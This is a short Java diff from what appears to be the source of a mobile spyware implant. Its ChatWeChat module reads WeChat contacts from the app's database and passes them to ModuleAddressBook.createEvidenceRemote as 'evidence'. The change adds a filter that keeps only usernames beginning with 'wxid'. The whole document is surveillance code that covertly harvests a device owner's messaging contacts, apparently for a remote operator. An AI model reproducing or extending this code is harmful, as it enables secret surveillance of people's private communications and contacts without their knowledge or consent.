@@ -158,6 +158,7 @@ public class ChatWeChat extends SubModuleChat {
 				setMyAccount(helper);
 				ChatGroups groups = getChatGroups(helper);
 
+				// Save contacts if AddressBook is active
 				if (ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)) {
 					saveWechatContacts(helper);
 				}
@@ -276,12 +277,13 @@ public class ChatWeChat extends SubModuleChat {
 				String nick = cursor.getString(1);
 
 				Contact c = new Contact(username, username, nick, "");
-
-				if (ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.WECHAT, c)) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (cursor) need to serialize");
+				if (username != null && username.startsWith("wxid")) {
+					if (ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.WECHAT, c)) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (cursor) need to serialize");
+						}
+						return 1;
 					}
-					return 1;
 				}
 				return 0;
 			}
